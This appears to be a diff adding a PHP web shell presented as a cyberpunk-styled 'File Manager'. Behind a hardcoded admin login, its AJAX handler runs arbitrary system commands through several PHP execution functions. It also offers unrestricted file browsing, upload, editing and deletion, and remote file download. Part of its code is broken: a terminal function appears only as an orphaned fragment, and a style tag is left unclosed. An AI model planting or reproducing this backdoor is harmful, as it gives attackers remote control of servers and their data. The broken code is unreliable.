@@ -1,0 +1,566 @@
+<?php
+/********************************************************************
+ *  
+ *
+ *
+ *  
+ *  
+ *  
+ ********************************************************************/
+
+session_start();
+error_reporting(E_ALL);
+
+/* ----------------- LOGIN ----------------- */
+$USER = "admin";
+$PASS = password_hash("admin46", PASSWORD_DEFAULT);
+
+if (!isset($_SESSION['ok'])) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
+        if ($_POST['u'] === $USER && password_verify($_POST['p'], $PASS)) {
+            $_SESSION['ok'] = 1;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $login_err = "Invalid username or password.";
+        }
+    }
+    echo '<!doctype html><html><head><meta charset="utf-8"><title>Login</title>
+    <style>
+      body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#07070b;color:#e6eef8;font-family:Inter,Segoe UI,Arial;}
+      .box{width:360px;padding:28px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.18));box-shadow:0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03);}
+      h1{margin:0 0 14px 0;font-size:20px;color:#7be3ff;text-align:center;letter-spacing:0.6px}
+      label{font-size:12px;color:#9fb8c9}
+      input{width:100%;padding:12px;margin-top:8px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8}
+      .btn{width:100%;padding:12px;margin-top:14px;border-radius:10px;border:none;background:linear-gradient(90deg,#8affff,#6b6bff);color:#071028;font-weight:700;cursor:pointer;box-shadow:0 6px 24px rgba(107,107,255,0.14)}
+      .err{margin-top:10px;color:#ff8080;text-align:center;font-size:13px}
+      .hint{margin-top:8px;font-size:12px;color:#7b9bb0;text-align:center}
+    </style></head><body>
+    <div class="box">
+      <h1>FILE MANAGER</h1>
+      <form method="POST">
+        <label>Username</label>
+        <input name="u" required autofocus>
+        <label>Password</label>
+        <input type="password" name="p" required>
+        <button class="btn">Unlock</button>
+      </form>';
+    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
+    echo '<div class="hint">Default: <b>admin</b> / <b>admin123</b></div></div></body></html>';
+    exit;
+}
+
+/* ----------------- PATH ----------------- */
+$ROOT = realpath($_GET['dir'] ?? __DIR__) ?: __DIR__;
+$dir = $ROOT;
+
+/* ----------------- HELPERS ----------------- */
+function hfs($bytes){
+    $u=["B","KB","MB","GB","TB"];
+    $i=0;
+    while($bytes>=1024 && $i < count($u)-1){ $bytes/=1024; $i++; }
+    return round($bytes,2).' '.$u[$i];
+}
+function esc($s){ return htmlspecialchars($s, ENT_QUOTES); }
+
+/* ----------------- ACTIONS ----------------- */
+// Create folder
+if (isset($_POST['new_folder']) && trim($_POST['new_folder'])!=='') {
+    @mkdir($dir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']));
+    header("Location:?dir=" . urlencode($dir)); exit;
+}
+// Create file
+if (isset($_POST['new_file']) && trim($_POST['new_file'])!=='') {
+    @file_put_contents($dir . DIRECTORY_SEPARATOR . basename($_POST['new_file']), "");
+    header("Location:?dir=" . urlencode($dir)); exit;
+}
+// Upload files
+if (!empty($_FILES['upload']['name'][0])) {
+    foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
+        $name = basename($_FILES['upload']['name'][$k]);
+        @move_uploaded_file($tmp, $dir . DIRECTORY_SEPARATOR . $name);
+    }
+    header("Location:?dir=" . urlencode($dir)); exit;
+}
+// Delete file
+if (isset($_POST['del_file'])) {
+    $p = realpath($_POST['del_file']);
+    if ($p && is_file($p)) @unlink($p);
+    header("Location:?dir=" . urlencode($dir)); exit;
+}
+// View / Edit
+$file_content = '';
+$edit_file_path = '';
+if (isset($_POST['view_file'])) {
+    $p = realpath($_POST['view_file']);
+    if ($p && is_file($p)) {
+        $file_content = file_get_contents($p);
+        $edit_file_path = $p;
+    }
+}
+if (isset($_POST['save_file'])) {
+    $p = $_POST['save_file_path'];
+    @file_put_contents($p, $_POST['file_content']);
+    header("Location:?dir=" . urlencode(dirname($p))); exit;
+}
+// ZIP current folder
+if (isset($_POST['zip_folder'])) {
+    $zipname = $dir . DIRECTORY_SEPARATOR . "archive_" . time() . ".zip";
+    $zip = new ZipArchive;
+    if ($zip->open($zipname, ZipArchive::CREATE)) {
+        foreach (scandir($dir) as $f) {
+            if ($f == '.' || $f == '..') continue;
+            $path = $dir . DIRECTORY_SEPARATOR . $f;
+            if (is_file($path)) $zip->addFile($path, $f);
+        }
+        $zip->close();
+    }
+    header("Location:?dir=" . urlencode($dir)); exit;
+}
+// UNZIP
+if (isset($_POST['unzip_file'])) {
+    $p = realpath($_POST['unzip_file']);
+    if ($p) {
+        $zip = new ZipArchive;
+        if ($zip->open($p)) {
+            $zip->extractTo($dir);
+            $zip->close();
+        }
+    }
+    header("Location:?dir=" . urlencode($dir)); exit;
+}
+
+// =============================================================================
+// COMMAND EXECUTION FUNCTIONS
+// =============================================================================
+
+/**
+ * Execute command dan return output
+ */
+function executeCommand($command) {
+    $output = [];
+    $return_var = 0;
+    
+    // Method 1: exec()
+    exec($command . ' 2>&1', $output, $return_var);
+    
+    return [
+        'output' => implode("\n", $output),
+        'exit_code' => $return_var,
+        'success' => $return_var === 0
+    ];
+}
+
+/**
+ * Execute command dengan shell_exec()
+ */
+function executeCommandShell($command) {
+    $output = shell_exec($command . ' 2>&1');
+    return $output ?? 'No output';
+}
+
+/**
+ * Execute command dengan system()
+ */
+function executeCommandSystem($command) {
+    ob_start();
+    system($command . ' 2>&1', $return_var);
+    $output = ob_get_clean();
+    
+    return [
+        'output' => $output,
+        'exit_code' => $return_var
+    ];
+}
+
+/**
+ * Execute command dengan passthru()
+ */
+function executeCommandPassthru($command) {
+    ob_start();
+    passthru($command . ' 2>&1', $return_var);
+    $output = ob_get_clean();
+    
+    return [
+        'output' => $output,
+        'exit_code' => $return_var
+    ];
+}
+
+/**
+ * Execute command dengan proc_open() (advanced)
+ */
+function executeCommandProc($command) {
+    $descriptorspec = [
+        0 => ["pipe", "r"],  // stdin
+        1 => ["pipe", "w"],  // stdout
+        2 => ["pipe", "w"]   // stderr
+    ];
+    
+    $process = proc_open($command, $descriptorspec, $pipes);
+    
+    if (is_resource($process)) {
+        $stdout = stream_get_contents($pipes[1]);
+        $stderr = stream_get_contents($pipes[2]);
+        
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        
+        $return_value = proc_close($process);
+        
+        return [
+            'stdout' => $stdout,
+            'stderr' => $stderr,
+            'exit_code' => $return_value,
+            'output' => $stdout . $stderr
+        ];
+    }
+    
+    return ['error' => 'Failed to execute command'];
+}
+
+// =============================================================================
+// HANDLE AJAX REQUEST
+// =============================================================================
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax'])) {
+    header('Content-Type: application/json');
+    
+    $command = $_POST['command'] ?? '';
+    $method = $_POST['method'] ?? 'exec';
+    
+    if (empty($command)) {
+        echo json_encode(['error' => 'No command provided']);
+        exit;
+    }
+    
+    // Log command
+    error_log("Terminal Command: $command");
+    
+    // Execute based on method
+    switch ($method) {
+        case 'shell_exec':
+            $result = ['output' => executeCommandShell($command)];
+            break;
+        case 'system':
+            $result = executeCommandSystem($command);
+            break;
+        case 'passthru':
+            $result = executeCommandPassthru($command);
+            break;
+        case 'proc_open':
+            $result = executeCommandProc($command);
+            break;
+        default:
+            $result = executeCommand($command);
+    }
+    
+    echo json_encode($result);
+    exit;
+}
+
+    // Jika sintaks tidak sesuai
+    $out = "❌ Usage: curl -L -o filename URL";
+    break;
+    case 'wget':
+    if (!isset($parts[1])) {
+        $out = "❌ Usage: wget URL [-O filename]";
+        break;
+    }
+
+    $url = filter_var($parts[1], FILTER_VALIDATE_URL);
+    if (!$url) {
+        $out = "❌ Invalid URL.";
+        break;
+    }
+
+    // Cek apakah ada parameter -O
+    $saveTo = null;
+    if (isset($parts[2]) && $parts[2] === '-O' && isset($parts[3])) {
+        $saveTo = basename($parts[3]); // hindari path traversal
+    }
+
+    // Download konten
+    $ctx = stream_context_create([
+        'http' => [
+            'timeout' => 10,
+            'method'  => "GET",
+            'header'  => "User-Agent: SafeWgetPHP/1.0\r\n"
+        ]
+    ]);
+
+    $data = @file_get_contents($url, false, $ctx);
+
+    if ($data === false) {
+        $out = "❌ Failed to fetch URL.";
+        break;
+    }
+
+    // Jika tidak pakai -O → tampilkan di terminal
+    if (!$saveTo) {
+        $out = substr($data, 0, 50000);
+        break;
+    }
+
+    // Simpan file ke direktori kerja
+    $savePath = $dir . DIRECTORY_SEPARATOR . $saveTo;
+    if (@file_put_contents($savePath, $data) !== false) {
+        $out = "✔ Saved to: $saveTo";
+    } else {
+        $out = "❌ Failed to save file.";
+    }
+    break;
+        default:
+            $out = "❌ Command not allowed.";
+    }
+    return $out;
+}
+$terminal_output = '';
+if (isset($_POST['terminal_cmd'])) {
+    $terminal_output = run_terminal_safe($_POST['terminal_cmd'], $dir);
+}
+
+/* ----------------- HTML UI (DARK CYBERPUNK) ----------------- */
+?><!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>File Manager</title>
+<style>
+:root{
+  --bg:#07070b;
+  --panel:#0f1220;
+  --muted:#90a3b8;
+  --neon-cyan:#6df0ff;
+  --neon-mag:#b46cff;
+  --accent:#6df0ff;
+  --glass: rgba(255,255,255,0.03);
+}
+*{box-sizing:border-box}
+body{margin:0;font-family:Inter,Segoe UI,Arial;background:
+radial-gradient(1200px 600px at 10% 10%, rgba(124,58,237,0.06), transparent 6%),
+radial-gradient(1000px 500px at 90% 90%, rgba(35,211,243,0.03), transparent 6%),
+var(--bg);color:#e6eef8;min-height:100vh}
+.container{max-width:1180px;margin:28px auto;padding:18px}
+.header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px}
+.brand{display:flex;align-items:center;gap:12px}
+.logo{width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,#0ff,#a0f);display:flex;align-items:center;justify-content:center;color:#071028;font-weight:900;font-family:monospace}
+.title{font-size:20px;font-weight:700;letter-spacing:0.6px;color:var(--neon-cyan)}
+.controls{display:flex;gap:10px;align-items:center}
+
+/* top cards */
+.top-row{display:grid;grid-template-columns: 1fr 420px;gap:14px;margin-bottom:14px}
+.card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.03);box-shadow: 0 8px 30px rgba(15,20,30,0.5)}
+.card h3{margin:0 0 8px 0;color:var(--neon-mag);font-size:15px}
+.small{color:var(--muted);font-size:13px}
+
+/* actions grid */
+.actions{display:flex;gap:10px;flex-wrap:wrap}
+.action-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:700;box-shadow:0 8px 30px rgba(75,0,130,0.12)}
+.action-btn:hover{transform:translateY(-4px);box-shadow:0 10px 40px rgba(75,0,130,0.18)}
+.action-btn .ico{font-size:18px;filter:drop-shadow(0 2px 8px rgba(107,107,255,0.18))}
+
+/* forms */
+.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+.input, input[type="file"], select{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--neon-cyan)}
+.btn-neon{background:linear-gradient(90deg,var(--neon-cyan),#7a6bff);border-radius:10px;padding:10px 14px;border:none;color:#071028;font-weight:800;cursor:pointer;box-shadow:0 14px 40px rgba(109,240,255,0.06)}
+.btn-danger{background:linear-gradient(90deg,#ff5f7a,#ff9fb4);color:#071028}
+
+/* file table */
+.table-wrap{overflow:auto;border-radius:10px}
+table{width:100%;border-collapse:collapse;min-width:720px}
+th,td{padding:12px 14px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03)}
+th{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.06));color:var(--muted);font-size:13px}
+tr:hover td{background:linear-gradient(90deg, rgba(109,240,255,0.02), rgba(180,108,255,0.01))}
+.filename{font-weight:700;color:#ffffff}
+.filetype{font-size:13px;color:var(--muted)}
+.kv{font-size:13px;color:var(--muted)}
+
+/* right column: terminal & uploader stacked */
+.right-col{display:flex;flex-direction:column;gap:12px}
+.uploader{display:flex;flex-direction:column;gap:8px}
+.uploader input[type=file]{padding:8px;background:transparent;border:1px dashed rgba(255,255,255,0.04);border-radius:8px;color:var(--muted)}
+.upload-actions{display:flex;gap:8px}
+
+/* editor card */
+.editor{min-height:160px;padding:12px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.12));border:1px solid rgba(255,255,255,0.03)}
+.editor textarea{width:100%;height:220px;background:transparent;border:none;color:#e6eef8;font-family:Consolas,monospace;resize:vertical;outline:none}
+
+/* terminal */
+.terminal{background:#040408;border-radius:10px;padding:12px;color:#aee7ff;height:260px;overflow:auto;font-family:monospace;border:1px solid rgba(109,240,255,0.06)}
+.terminal .prompt{color:#6df0ff}
+.terminal-input{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:#071026;color:#cdefff;margin-top:8px}
+
+/* footer */
+.footer{margin-top:18px;color:var(--muted);font-size:13px;text-align:center}
+
+/* responsiveness */
+@media(max-width:980px){
+  .top-row{grid-template-columns:1fr}
+  .form-grid{grid-template-columns:1fr}
+  .right-col{order:2}
+  .table-wrap{order:1;margin-top:12px}
+}
+</style
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <div class="brand">
+      <div class="logo">CY</div>
+      <div>
+        <div class="title">File Manager</div>
+      </div>
+    </div>
+
+    <div class="controls">
+      <form method="GET" style="display:inline">
+        <input type="hidden" name="dir" value="<?=esc($ROOT)?>">
+        <button class="action-btn" formaction="?dir=<?=esc($ROOT)?>" title="Back to root"><span class="ico">🏠</span> ROOT</button>
+      </form>
+      <form method="GET" style="display:inline">
+        <input type="text" name="dir" placeholder="Open folder path..." class="input" style="width:320px;background:rgba(255,255,255,0.02);color:#bfefff">
+        <button class="action-btn" style="padding:10px 12px">🔎 Open</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="top-row">
+    <!-- LEFT: file list -->
+    <div class="card">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+        <h3>File Explorer</h3>
+        <div class="small"><?=esc($dir)?></div>
+      </div>
+
+      <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
+        <form method="POST" style="margin:0">
+          <button class="action-btn" name="zip_folder" title="Zip current folder"><span class="ico">📦</span> ZIP FOLDER</button>
+        </form>
+
+        <form method="POST" enctype="multipart/form-data" style="margin:0">
+          <label style="display:inline-flex;gap:8px;align-items:center">
+            <input type="file" name="upload[]" multiple style="display:none" id="filepick">
+            <button type="button" class="action-btn" onclick="document.getElementById('filepick').click()"><span class="ico">⬆️</span> SELECT FILES</button>
+          </label>
+          <button class="action-btn btn-neon" type="submit" style="margin-left:6px">UPLOAD</button>
+        </form>
+      </div>
+
+      <div class="form-grid">
+        <form method="POST" style="display:flex;gap:8px">
+          <input class="input" name="new_folder" placeholder="New folder name">
+          <button class="btn-neon" type="submit">Create Folder</button>
+        </form>
+
+        <form method="POST" style="display:flex;gap:8px">
+          <input class="input" name="new_file" placeholder="New file name (ex: note.txt)">
+          <button class="btn-neon" type="submit">Create File</button>
+        </form>
+      </div>
+
+      <div class="table-wrap" style="margin-top:12px">
+        <table>
+          <thead>
+            <tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>
+          </thead>
+          <tbody>
+            <?php foreach (scandir($dir) as $f): if ($f=='.' || $f=='..') continue; $p = $dir . DIRECTORY_SEPARATOR . $f; ?>
+            <tr>
+              <td class="filename"><?=esc($f)?></td>
+              <td class="filetype"><?=is_dir($p) ? 'Folder' : 'File'?></td>
+              <td class="kv"><?=is_file($p) ? hfs(filesize($p)) : '-'?></td>
+              <td style="white-space:nowrap">
+                <?php if (is_dir($p)): ?>
+                  <a href="?dir=<?=urlencode($p)?>" style="text-decoration:none"><button class="action-btn" type="button">📂 Open</button></a>
+                <?php else: ?>
+                  <a href="<?=esc($p)?>" download style="text-decoration:none"><button class="action-btn" type="button">⬇ Download</button></a>
+                  <form method="POST" style="display:inline">
+                    <input type="hidden" name="del_file" value="<?=esc($p)?>" />
+                    <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px">🗑 Delete</button>
+                  </form>
+                  <form method="POST" style="display:inline">
+                    <input type="hidden" name="view_file" value="<?=esc($p)?>" />
+                    <button class="action-btn" style="margin-left:6px">✏️ Edit</button>
+                  </form>
+                  <?php if (pathinfo($p, PATHINFO_EXTENSION) === 'zip'): ?>
+                    <form method="POST" style="display:inline">
+                      <input type="hidden" name="unzip_file" value="<?=esc($p)?>" />
+                      <button class="action-btn" style="margin-left:6px">📂 Unzip</button>
+                    </form>
+                  <?php endif; ?>
+                <?php endif; ?>
+              </td>
+            </tr>
+            <?php endforeach; ?>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- RIGHT: uploader + terminal -->
+    <div class="right-col">
+      <div class="card uploader">
+        <h3>Upload FILE</h3>
+        <form method="POST" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:8px;margin-top:8px">
+          <input type="file" name="upload[]" multiple>
+          <div class="upload-actions">
+            <button class="btn-neon" type="submit">Upload Selected</button>
+            <button type="button" onclick="document.getElementById('newfolder').focus()" class="action-btn" style="background:linear-gradient(90deg,#ff8aec,#7a6bff)">✚ Quick</button>
+          </div>
+        </form>
+
+        <div style="margin-top:10px">
+          <form method="POST" style="display:flex;gap:8px">
+            <input id="newfolder" class="input" name="new_folder" placeholder="Create folder name">
+            <button class="btn-neon" type="submit">Create</button>
+          </form>
+          <form method="POST" style="display:flex;gap:8px;margin-top:8px">
+            <input class="input" name="new_file" placeholder="Create file name">
+            <button class="btn-neon" type="submit">Create</button>
+          </form>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Terminal</h3>
+        <div class="terminal" id="termOutput"><?=nl2br(esc($terminal_output))?></div>
+        <form method="POST" style="margin-top:8px">
+          <input class="terminal-input" name="terminal_cmd" placeholder="Type command, e.g. ls or cat file.txt">
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Editor modal-ish area -->
+  <?php if ($file_content): ?>
+  <div class="card editor" id="editorCard">
+    <div style="display:flex;justify-content:space-between;align-items:center">
+      <div><strong>Editing</strong> <?=esc(basename($edit_file_path))?></div>
+      <div class="small"><?=esc(dirname($edit_file_path))?></div>
+    </div>
+    <form method="POST" style="margin-top:10px">
+      <textarea name="file_content"><?=esc($file_content)?></textarea>
+      <input type="hidden" name="save_file_path" value="<?=esc($edit_file_path)?>">
+      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:10px">
+        <button class="btn-neon" name="save_file" type="submit">💾 Save File</button>
+        <a href="?dir=<?=urlencode(dirname($edit_file_path))?>" style="text-decoration:none"><button type="button" class="action-btn" style="background:linear-gradient(90deg,#222,#061023);color:var(--neon-cyan)">← Back</button></a>
+      </div>
+    </form>
+  </div>
+  <?php endif; ?>
+
+</div>
+
+<script>
+// small UX: auto-scroll terminal to bottom
+(function(){
+  var term = document.getElementById('termOutput');
+  if(term) term.scrollTop = term.scrollHeight;
+})();
+</script>
+</body>
+</html>
